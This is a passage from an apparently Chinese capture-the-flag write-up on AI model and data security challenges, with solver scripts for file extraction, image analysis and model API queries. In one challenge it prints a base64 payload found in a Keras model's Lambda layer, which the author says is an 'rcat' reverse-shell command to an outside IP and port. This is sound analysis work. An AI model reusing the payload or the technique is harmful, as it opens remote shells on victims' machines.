</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/about&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/services&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/title&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/products&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/api\/v2\/safe&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/register&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/temp&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/logs\/public&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/system&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/search\?q=&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/.*\.zip$&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s2>&#34;\/restricted&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sa>r</span><span class=s1>&#39;\/cart&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cnt</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>link</span> <span class=ow>in</span> <span class=n>links</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>link</span><span class=p>)</span> <span class=k>for</span> <span class=n>pattern</span> <span class=ow>in</span> <span class=n>disallow</span><span class=p>)</span> <span class=ow>and</span> <span class=p>(</span><span class=ow>not</span> <span class=nb>any</span><span class=p>(</span><span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern</span><span class=p>,</span> <span class=n>link</span><span class=p>)</span> <span class=k>for</span> <span class=n>pattern</span> <span class=ow>in</span> <span class=n>allow</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>cnt</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>cnt</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>答案：503</strong></p><h3 id=数据识别与审计-题目4>数据识别与审计 题目4</h3><p>txt肉眼排，有地址电话啥的</p><p>png pdf分析16进制内容就行，有恶意代码</p><p>mp3没看出来</p><h3 id=模型环境安全-2>模型环境安全 2</h3><p>将model绘出，可以在其中一个模型绘制的时候发现有恶意命令rcat，base64解码就可以得到rcat ip port</p><p>Model: model_263.h5  - input_layer  - l2_norm</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>__lambda__</span><span class=p>(</span><span class=n>code</span><span class=p>:</span> <span class=s2>&#34;4wEAAAAAAAAAAAAAAAQAAAADAAAA81IAAACXAGQBdAEAAAAAAAAAAAAAZAKmAQAAqwEAAAAAAAAA AKABAAAAAAAAAAAAAAAAAAAAAAAAAABkA6YBAACrAQAAAAAAAAAAegUAAHwAegUAAFMAKQRO7AoA AADHcTgOxwEXLs8aCnPkLM1ahkYCANoCb3P6InJjYXQgMTIzLjEwLjE5LjExNiA5ODAwIC1yIC9i aW4vc2gpAtoKX19pbXBvcnRfX9oGc3lzdGVtKQHaAXhzAQAAACD6HS90bXAvcHljaGFybV9wcm9q ZWN0Xzc4NS8xLnB5+gg8bGFtYmRhPnIJAAAADAAAAHNAAAAAgADQI03NetBaYdFPYtRPYtdOatJO avAAAGwBUALxAABPAVEC9AAATwFRAvEAACRRAvAAAFMCVALxAAAjVAKAAPMAAAAA &#34;</span><span class=p>,</span> <span class=n>defaults</span><span class=p>:</span> <span class=n>null</span><span class=p>,</span> <span class=n>closure</span><span class=p>:</span> <span class=n>null</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=模型环境安全-3>模型环境安全 3</h3><p>从请求数据中还原png文件，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_image</span><span class=p>(</span><span class=n>file_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>  
</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>png_name</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>image_data</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>in_image_data</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>boundary</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;------WebKitFormBoundary9lDwFiUWLasddd16&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>hex_header</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x89\x50\x4E\x47</span><span class=s1>&#39;</span>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>line</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Content-Disposition:&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>png_name</span> <span class=o>=</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;filename=&#34;&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&#34;&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Extracting image with filename: </span><span class=si>{</span><span class=n>png_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>hex_header</span> <span class=o>==</span> <span class=n>line</span><span class=p>[:</span><span class=mi>4</span><span class=p>]:</span>  <span class=c1># 检查是否是PNG文件头</span>
</span></span><span class=line><span class=cl>            <span class=n>in_image_data</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Found PNG header, starting to read image data&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>image_data</span> <span class=o>+=</span> <span class=n>line</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>in_image_data</span> <span class=ow>and</span> <span class=ow>not</span> <span class=n>line</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>boundary</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>image_data</span> <span class=o>+=</span> <span class=n>line</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>line</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>boundary</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>png_name</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>png_name</span> <span class=o>=</span> <span class=n>png_name</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39;extracted_images&#39;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>png_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>),</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>img_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>img_file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>image_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Saved image to file: </span><span class=si>{</span><span class=n>png_name</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># 准备处理下一张图片</span>
</span></span><span class=line><span class=cl>            <span class=n>png_name</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>            <span class=n>image_data</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>in_image_data</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 示例用法</span>
</span></span><span class=line><span class=cl><span class=n>file_path</span> <span class=o>=</span> <span class=s1>&#39;upload&#39;</span>  <span class=c1># 请将此路径替换为你的文件路径</span>
</span></span><span class=line><span class=cl><span class=n>extract_image</span><span class=p>(</span><span class=n>file_path</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>会得到一张张有信用卡、姓名和身份证的图表截图，读取行数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>count_black_pixels</span><span class=p>(</span><span class=n>image_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>image_path</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s2>&#34;L&#34;</span><span class=p>)</span>  <span class=c1># 转换为灰度图</span>
</span></span><span class=line><span class=cl>    <span class=n>pixels</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>load</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>width</span><span class=p>,</span> <span class=n>height</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=n>black_count</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>height</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pixels</span><span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=n>y</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>  <span class=c1># 假设黑色像素点在第1列为0</span>
</span></span><span class=line><span class=cl>            <span class=n>black_count</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>black_count</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>folder_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>png_files</span> <span class=o>=</span> <span class=p>[</span><span class=n>f</span> <span class=k>for</span> <span class=n>f</span> <span class=ow>in</span> <span class=n>os</span><span class=o>.</span><span class=n>listdir</span><span class=p>(</span><span class=n>folder_path</span><span class=p>)</span> <span class=k>if</span> <span class=n>f</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s1>&#39;.png&#39;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>total_black_pixels</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>file</span> <span class=ow>in</span> <span class=n>png_files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>image_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>folder_path</span><span class=p>,</span> <span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>black_count</span> <span class=o>=</span> <span class=n>count_black_pixels</span><span class=p>(</span><span class=n>image_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;File: </span><span class=si>{</span><span class=n>file</span><span class=si>}</span><span class=s2>, Black Pixels Count: </span><span class=si>{</span><span class=n>black_count</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>total_black_pixels</span> <span class=o>+=</span> <span class=n>black_count</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Total Black Pixels in All Images: </span><span class=si>{</span><span class=n>total_black_pixels</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=c1># 使用示例</span>
</span></span><span class=line><span class=cl><span class=n>folder_path</span> <span class=o>=</span> <span class=s2>&#34;.&#34;</span>
</span></span><span class=line><span class=cl><span class=n>main</span><span class=p>(</span><span class=n>folder_path</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=32-人工智能模型数据安全挑战赛>3.2 人工智能模型数据安全挑战赛</h2><h3 id=模型推理安全-1>模型推理安全 1</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>joblib</span> <span class=kn>import</span> <span class=n>load</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>csv</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scipy.sparse</span> <span class=kn>import</span> <span class=n>csr_matrix</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;词表.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>reader</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>reader</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>phone_list</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>reader</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=n>loaded_vectorizer</span> <span class=o>=</span> <span class=n>load</span><span class=p>(</span><span class=s1>&#39;tfidf_vectorizer.pkl&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>id</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>results</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>phone_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>phone</span> <span class=o>=</span> <span class=p>[</span><span class=n>row</span><span class=p>[</span><span class=mi>1</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>    <span class=n>features</span> <span class=o>=</span> <span class=n>loaded_vectorizer</span><span class=o>.</span><span class=n>transform</span><span class=p>(</span><span class=n>phone</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Sample 0 的非零特征及其值：&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>features</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>        <span class=n>row</span> <span class=o>=</span> <span class=n>features</span><span class=o>.</span><span class=n>getrow</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>features</span><span class=o>.</span><span class=n>shape</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span><span class=p>,</span> <span class=n>score</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>row</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;特征 </span><span class=si>{</span><span class=n>j</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>score</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=nb>id</span><span class=p>,</span> <span class=s1>&#39;score&#39;</span><span class=p>:</span> <span class=n>score</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=nb>id</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;mid2.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>newline</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>DictWriter</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>fieldnames</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>,</span> <span class=s1>&#39;score&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>writer</span><span class=o>.</span><span class=n>writeheader</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>result</span> <span class=ow>in</span> <span class=n>results</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>writer</span><span class=o>.</span><span class=n>writerow</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>torch</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>torch.nn.functional</span> <span class=k>as</span> <span class=nn>F</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>csv</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>math</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>predict_sentiment</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://192.168.81.200:19001/predict&#39;</span>  <span class=c1># 替换为你的服务器URL</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;text&#39;</span><span class=p>:</span> <span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>payload</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#{&#39;probability&#39;: [0.0004062276161705958, 0.9995937723838294], &#39;result&#39;: 1}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;词表.csv&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span><span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>reader</span> <span class=o>=</span> <span class=n>csv</span><span class=o>.</span><span class=n>reader</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>phone_list</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>reader</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>results</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=nb>id</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl><span class=c1># 发送查询请求并分析概率变化</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>phone_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>phone</span> <span class=o>=</span> <span class=n>row</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>predict_sentiment</span><span class=p>(</span><span class=n>phone</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># 提取模型输出的情感分类概率</span>
</span></span><span class=line><span class=cl>    <span class=n>probability</span> <span class=o>=</span> <span class=n>torch</span><span class=o>.</span><span class=n>Tensor</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=s1>&#39;probability&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>probability</span><span class=p>)</span>
